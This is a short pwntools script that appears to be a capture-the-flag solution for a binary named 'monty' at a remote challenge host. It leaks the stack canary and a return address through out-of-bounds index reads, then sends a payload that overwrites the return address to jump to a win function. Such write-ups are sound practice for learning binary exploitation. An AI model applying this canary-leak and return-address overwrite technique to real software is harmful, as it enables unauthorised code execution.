from pwn import * 

exe = context.binary = ELF('monty')

#io = exe.process()
io = remote('chall.lac.tf', 31132)
io.recvuntil(b'index of your first peek? ')
io.sendline(b'55')
io.recvuntil(b'Peek 1: ')
canary = int(io.recvline().strip())
log.info(f'canary: {p64(canary)}')
io.recvuntil(b'index of your second peek? ')
io.sendline(b'57')
io.recvuntil(b'Peek 2: ')
winaddr = int(io.recvline().strip()) - 1093
log.info(f'winaddr: {p64(winaddr)}')

payload = fit({
    24: canary,
    40: winaddr
})
io.recvuntil(b'Show me the lady! ')
io.sendline(b'1')
io.recvuntil(b'Name: ')
io.sendline(payload)
io.recvline()
io.recvline()
print(io.recvline())